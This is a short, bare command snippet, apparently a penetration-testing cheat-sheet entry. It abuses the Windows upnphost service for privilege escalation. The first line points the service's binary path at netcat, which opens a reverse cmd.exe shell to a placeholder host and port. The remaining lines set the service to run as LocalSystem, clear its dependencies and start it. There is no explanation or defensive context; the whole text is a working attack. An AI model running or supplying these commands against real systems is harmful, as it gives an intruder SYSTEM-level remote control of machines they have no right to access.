```powershell
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe $TARGET $PORT -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```
